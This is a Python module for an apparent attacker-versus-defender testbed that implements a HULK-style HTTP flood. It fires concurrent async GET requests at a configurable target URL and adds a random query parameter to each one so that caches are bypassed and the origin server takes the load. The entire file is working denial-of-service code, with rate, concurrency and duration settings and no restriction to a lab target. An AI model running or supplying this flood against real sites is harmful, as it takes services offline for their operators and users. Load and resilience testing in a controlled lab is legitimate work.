"""HULK-style HTTP flood — each request uses a unique URL parameter
to bypass CDN / reverse-proxy caching and hit the origin server directly.

Reference: https://github.com/grafov/hulk

Each request appends a random query parameter (?r=<random>) to the endpoint
so every request looks "new" to caching layers. Uses httpx.AsyncClient.
"""
from __future__ import annotations

import asyncio
import logging
import random
import time
from typing import Any, Dict
from urllib.parse import urljoin, urlencode

import httpx

from .metrics import MetricsCollector

log = logging.getLogger("attacker.hulk_flood")


async def run(playbook: Dict[str, Any], metrics: MetricsCollector) -> None:
    params = playbook.get("parameters", {})
    target_url: str = params.get("targetUrl", "http://defender:8080")
    endpoints = params.get("targetEndpoints") or ["/"]
    user_agents = params.get("userAgents") or ["Mozilla/5.0"]
    concurrency = int(params.get("concurrentConnections", 100))
    rps = int(params.get("requestsPerSecond") or 50)
    duration = int(params.get("durationSec", 30))
    headers_extra = params.get("headers") or {}

    log.info(
        "hulk_flood start url=%s endpoints=%d concurrency=%d rps=%d duration=%ds",
        target_url, len(endpoints), concurrency, rps, duration,
    )

    sem = asyncio.Semaphore(concurrency)
    deadline = time.time() + duration
    rr_ep = 0
    rr_ua = 0

    timeout = httpx.Timeout(connect=5.0, read=10.0, write=5.0, pool=5.0)
    limits = httpx.Limits(max_connections=concurrency * 2, max_keepalive_connections=concurrency)

    async with httpx.AsyncClient(timeout=timeout, limits=limits, follow_redirects=False, verify=False) as client:
        async def one_request(base_url: str, ua: str) -> None:
            t0 = time.perf_counter()
            try:
                async with sem:
                    # HULK trick: append unique random param to bypass cache
                    rand_param = f"?r={random.randint(0, 2**31 - 1)}"
                    url = base_url + rand_param
                    headers = {"User-Agent": ua, **headers_extra}
                    resp = await client.get(url, headers=headers)
                latency = (time.perf_counter() - t0) * 1000.0
                if resp.status_code in (429, 503):
                    metrics.record(blocked=True, latency_ms=latency)
                elif 200 <= resp.status_code < 400:
                    metrics.record(success=True, latency_ms=latency)
                else:
                    metrics.record(error=True, latency_ms=latency)
            except Exception:
                latency = (time.perf_counter() - t0) * 1000.0
                metrics.record(error=True, latency_ms=latency)

        while time.time() < deadline:
            tick_start = time.time()
            for _ in range(rps):
                if time.time() >= deadline:
                    break
                ep = endpoints[rr_ep % len(endpoints)]
                ua = user_agents[rr_ua % len(user_agents)]
                rr_ep += 1
                rr_ua += 1
                base_url = urljoin(target_url.rstrip("/") + "/", ep.lstrip("/"))
                asyncio.create_task(one_request(base_url, ua))
            elapsed = time.time() - tick_start
            if elapsed < 1.0:
                await asyncio.sleep(1.0 - elapsed)

        await asyncio.sleep(2.0)

    log.info("hulk_flood done total=%d ok=%d blocked=%d err=%d",
             metrics.total, metrics.successful, metrics.blocked, metrics.errors)
